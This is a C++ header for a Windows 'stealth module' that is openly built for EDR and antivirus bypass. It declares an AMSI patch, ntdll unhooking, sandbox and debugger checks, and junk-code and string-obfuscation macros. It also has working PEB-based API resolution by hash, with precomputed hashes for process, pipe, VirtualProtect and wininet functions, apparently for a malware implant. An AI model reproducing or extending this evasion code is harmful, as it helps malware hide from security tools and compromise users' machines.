#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include <utility>

// ════════════════════════════════════════════════════════════════════════════
//  ADVANCED STEALTH MODULE - EDR/AV Bypass
// ════════════════════════════════════════════════════════════════════════════

namespace Stealth {

    // --- Core Dynamic Resolution ---
    constexpr DWORD HashApi(const char* str) {
        unsigned int hash = 5381;
        int c;
        while ((c = *str++))
            hash = ((hash << 5) + hash) + c;
        return hash;
    }

    FARPROC GetApiByHash(HMODULE hModule, DWORD funcHash);
    HMODULE GetModuleByHash(DWORD moduleHash); // Resolves module via PEB (No IAT)

    // --- Advanced Evasion ---
    void BypassAMSI();    // Patches AmsiScanBuffer
    void UnhookNtdll();   // Reloads clean ntdll from disk to remove EDR hooks
    bool IsBeingAnalyzed();

    // Comprehensive initialization
    void Initialize();

    // --- Junk Code ---
    #define JUNK_CODE_SMALL { volatile int x = 10, y = 20; if ((x + y) == 0) { } }

    // --- String Obfuscation Integration ---
    #define DECRYPT_W(data, key) Obfuscator::DecryptW(data, key)
}

// ════════════════════════════════════════════════════════════════════════════
//  DYNAMIC API CALLER (PEB BASED)
// ════════════════════════════════════════════════════════════════════════════

template<typename T> struct ApiWrapper;
template<typename Ret, typename... Args>
struct ApiWrapper<Ret(WINAPI*)(Args...)> {
    using FuncPtr = Ret(WINAPI*)(Args...);
    static Ret Call(DWORD modHash, DWORD funcHash, Args... args) {
        HMODULE hMod = Stealth::GetModuleByHash(modHash);
        if (!hMod) return Ret();
        FuncPtr func = reinterpret_cast<FuncPtr>(Stealth::GetApiByHash(hMod, funcHash));
        if (!func) return Ret();
        return func(args...);
    }
};

// Generic caller
#define CALL_API(modHash, funcHash, funcName, ...) \
    ApiWrapper<decltype(&funcName)>::Call(modHash, funcHash, __VA_ARGS__)

// ════════════════════════════════════════════════════════════════════════════
//  PRE-DEFINED HASHES
// ════════════════════════════════════════════════════════════════════════════

namespace Hashes {
    // Modules
    constexpr DWORD kernel32 = Stealth::HashApi("kernel32.dll");
    constexpr DWORD ntdll    = Stealth::HashApi("ntdll.dll");
    constexpr DWORD wininet  = Stealth::HashApi("wininet.dll");
    constexpr DWORD ole32    = Stealth::HashApi("ole32.dll");
    constexpr DWORD shell32  = Stealth::HashApi("shell32.dll");
    constexpr DWORD amsi     = Stealth::HashApi("amsi.dll");
    constexpr DWORD advapi32 = Stealth::HashApi("advapi32.dll");

    // APIs
    constexpr DWORD CreateProcessW           = Stealth::HashApi("CreateProcessW");
    constexpr DWORD TerminateProcess         = Stealth::HashApi("TerminateProcess");
    constexpr DWORD CreateNamedPipeW         = Stealth::HashApi("CreateNamedPipeW");
    constexpr DWORD ConnectNamedPipe         = Stealth::HashApi("ConnectNamedPipe");
    constexpr DWORD CreateFileW              = Stealth::HashApi("CreateFileW");
    constexpr DWORD ReadFile                 = Stealth::HashApi("ReadFile");
    constexpr DWORD WriteFile                = Stealth::HashApi("WriteFile");
    constexpr DWORD CloseHandle              = Stealth::HashApi("CloseHandle");
    constexpr DWORD CreateEventW             = Stealth::HashApi("CreateEventW");
    constexpr DWORD ResetEvent               = Stealth::HashApi("ResetEvent");
    constexpr DWORD WaitForSingleObject      = Stealth::HashApi("WaitForSingleObject");
    constexpr DWORD GetOverlappedResult      = Stealth::HashApi("GetOverlappedResult");
    constexpr DWORD CancelIoEx               = Stealth::HashApi("CancelIoEx");
    constexpr DWORD LoadLibraryW             = Stealth::HashApi("LoadLibraryW");
    constexpr DWORD FreeLibrary              = Stealth::HashApi("FreeLibrary");
    constexpr DWORD GetProcAddress           = Stealth::HashApi("GetProcAddress");
    constexpr DWORD SetNamedPipeHandleState  = Stealth::HashApi("SetNamedPipeHandleState");
    constexpr DWORD CreateToolhelp32Snapshot = Stealth::HashApi("CreateToolhelp32Snapshot");
    constexpr DWORD Process32FirstW          = Stealth::HashApi("Process32FirstW");
    constexpr DWORD Process32NextW           = Stealth::HashApi("Process32NextW");
    constexpr DWORD OpenProcess              = Stealth::HashApi("OpenProcess");
    constexpr DWORD Sleep                    = Stealth::HashApi("Sleep");
    constexpr DWORD DisconnectNamedPipe      = Stealth::HashApi("DisconnectNamedPipe");
    constexpr DWORD GetSystemInfo            = Stealth::HashApi("GetSystemInfo");
    constexpr DWORD GlobalMemoryStatusEx     = Stealth::HashApi("GlobalMemoryStatusEx");
    constexpr DWORD IsDebuggerPresent        = Stealth::HashApi("IsDebuggerPresent");
    constexpr DWORD GetExitCodeProcess       = Stealth::HashApi("GetExitCodeProcess");
    constexpr DWORD VirtualProtect           = Stealth::HashApi("VirtualProtect");
    constexpr DWORD GetTickCount64           = Stealth::HashApi("GetTickCount64");

    // wininet.dll
    constexpr DWORD InternetOpenW            = Stealth::HashApi("InternetOpenW");
    constexpr DWORD InternetOpenUrlW         = Stealth::HashApi("InternetOpenUrlW");
    constexpr DWORD InternetReadFile          = Stealth::HashApi("InternetReadFile");
    constexpr DWORD HttpSendRequestW         = Stealth::HashApi("HttpSendRequestW");
    constexpr DWORD InternetCloseHandle      = Stealth::HashApi("InternetCloseHandle");
    constexpr DWORD InternetSetOptionW       = Stealth::HashApi("InternetSetOptionW");
    constexpr DWORD HttpQueryInfoW           = Stealth::HashApi("HttpQueryInfoW");
    constexpr DWORD InternetCrackUrlW        = Stealth::HashApi("InternetCrackUrlW");
    constexpr DWORD InternetConnectW         = Stealth::HashApi("InternetConnectW");
    constexpr DWORD HttpOpenRequestW         = Stealth::HashApi("HttpOpenRequestW");

    // ole32.dll
    constexpr DWORD CoInitializeEx           = Stealth::HashApi("CoInitializeEx");
    constexpr DWORD CoUninitialize           = Stealth::HashApi("CoUninitialize");

    // shell32.dll
    constexpr DWORD SHGetFolderPathW         = Stealth::HashApi("SHGetFolderPathW");
}
